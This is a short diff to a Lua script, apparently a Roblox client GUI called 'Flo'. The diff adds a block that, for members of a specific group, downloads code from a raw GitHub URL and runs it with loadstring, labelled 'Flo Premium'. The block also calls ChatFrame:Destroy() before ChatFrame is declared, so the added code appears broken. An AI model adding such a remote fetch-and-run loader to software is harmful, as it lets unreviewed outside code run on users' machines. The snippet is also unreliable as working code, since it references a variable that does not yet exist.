@@ -1,3 +1,15 @@
+local LocalPlayer = game:GetService('Players').LocalPlayer
+
+local groupId = 15435994
+
+if LocalPlayer:IsInGroup(groupId) then
+    loadstring(game:HttpGet(("https://raw.githubusercontent.com/NovebL/NovBle/main/AKBarrel"), true))()
+    print("Loaded Flo Premium")
+    wait(0.1)
+    ChatFrame:Destroy()
+    end
+
+
 local ChatFrame = Instance.new("ScreenGui")
 local Flo = Instance.new("Frame")
 local CornerThatAss = Instance.new("UICorner")
